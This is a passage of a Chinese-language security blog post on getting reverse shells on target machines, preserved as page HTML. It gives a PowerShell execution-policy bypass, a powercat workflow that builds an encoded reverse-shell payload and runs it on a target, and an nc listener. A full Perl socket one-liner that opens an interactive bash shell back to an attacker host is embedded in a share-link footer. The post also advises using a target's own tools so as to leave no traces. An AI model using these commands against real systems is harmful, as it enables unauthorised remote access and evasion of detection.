<p><img src="/img/linux_mini_shell.png" alt="&#39;&#39;"><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">同样要记得去把脚本里要反弹到的ip和端口改成你自己的,这个格式化输出写的确实不怎么好</span><br><span class="line"># powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &apos;C:\minRev.ps1&apos;&#125;&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/img/linux_minrev_shell.png" alt="&#39;&#39;"><br></p>
<p>利用powercat来反弹shell,其实就是powershell版的netcat</p>
<p>首先,在本机创建好powershell版的reverse shell的payload,编码处理的还是蛮不错的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Set-ExecutionPolicy Unrestricted</span><br><span class="line">PS C:\&gt; cd .\powercat</span><br><span class="line">PS C:\powercat&gt; Import-Module .\powercat.ps1</span><br><span class="line">PS C:\powercat&gt; powercat -c 192.168.1.128 -p 8080 -e cmd -g &gt;&gt; payload.ps1</span><br><span class="line">C:\&gt;nc -lvp 8080</span><br></pre></td></tr></table></figure></p>
<p>然后,把payload.ps1丢到目标机器上去执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &apos;C:\payload.ps1&apos;&#125;&quot;</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/linux_poewrcat_shell.png" alt="&#39;&#39;"><br></p>
<p>关于nishang及其它各种powershell工具包中的各种反弹shell的方式,篇幅限制,这里就不一一说了,大家有兴趣可以去关注我的博客[klionsec.github.io],里面很久之前应该写过,可能比较粗糙,大家先将就看吧,后续我会抽空把博客好好整理一下,有点儿乱……</p>
<p>我知道,基于这种思路,可以衍生出来的方法还有非常非常的多,有兴趣咱们可以一起研究,不可否认的是,虽然只是一个简单的shell,但中间涉及到的东西依然是很值得学习的</p>
<p>0x07 一一些小结<br>&nbsp;&nbsp;&nbsp;&nbsp;反弹的核心说白点其实就是和目标系统建立socket(如果中间[不管是正向还是反向]端口被防火墙阻断了,那你可能就只能选择复用或者直接走更底层的协议了,还是那句话,只是一个shell而已,方法已经有了,怎么在实战中按照自己的需求改进,可能才是你更需要思考的,另外,我们也看到,反弹的时候,进程会一直处于挂起状态,实际中放到后台跑就好了</p>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://apt404.github.io/2016/09/28/revese-shell/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://apt404.github.io/2016/09/28/revese-shell/&text=你和目标只差一个shell的距离"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://apt404.github.io/2016/09/28/revese-shell/&is_video=false&description=你和目标只差一个shell的距离"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=你和目标只差一个shell的距离&body=Check out this article: https://apt404.github.io/2016/09/28/revese-shell/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://apt404.github.io/2016/09/28/revese-shell/&name=你和目标只差一个shell的距离&description=&lt;p&gt;&lt;br&gt;&lt;br&gt;0x01 前奏说明&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一直都建议,如果能利用目标系统自身的环境或者工具帮我们搞定的,最好就直接用那个,也省去了不少的麻烦,比如,最简单的,利用目标系统中自带的各种工具及语言环境帮我们弹回一个简单的可交互shell, 有shell,’夫何求’, 没错,你肯定会说,不就一个shell嘛,我直接用 coablt strike &amp;amp; msf 岂不更好,嘿嘿……其实,这里并不存在争论的点,不错,它俩确实挺好,不过,恶劣的环境总是有的,有时想把它俩用上确实比较费劲,好了,前戏就到此为止吧,下面我们就直奔主题……&lt;/p&gt;
&lt;p&gt;0x02 大致环境&lt;br&gt;&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;win7          192.168.1.128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;centos6.8     192.168.1.129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;win2008R2     192.168.1.131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kali          192.168.1.147&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x03 关于linux平台下弹shell的一些方式&lt;/p&gt;
&lt;p&gt;利用perl的socket,也是个人比较推荐的方式,因为现今几乎所有主流的linux发行版都已经装好了perl,细心的你也许会发现很多大马里弹shell的选项中一般都会有perl,后面bash -i的意思就是执行一个可交互的shell&lt;br&gt;&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;C:\&amp;gt;nc -lvp 53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# perl -e &amp;apos;use Socket;$i=&amp;quot;192.168.1.128&amp;quot;;$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&amp;#123;open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/bash -i&amp;quot;);&amp;#125;;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/linux_perl.png&#34; alt=&#34;&amp;#39;&amp;#39;&#34;&gt;&lt;br&gt;&lt;br&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 John Doe
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


